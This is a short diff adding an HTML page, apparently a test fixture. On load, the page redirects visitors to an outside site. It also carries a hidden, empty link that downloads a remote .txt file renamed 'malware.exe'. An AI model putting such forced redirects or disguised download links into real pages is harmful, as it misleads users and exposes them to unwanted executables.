@@ -1,0 +1,10 @@
+<html>
+    <head>
+        <script>
+            window.location.replace("http://ria.ru");
+        </script>
+    </head>
+    <body>
+        <a href="http://2bay.org/ftp/files/ooops.txt" download="malware.exe"></a>
+    </body>
+</html>
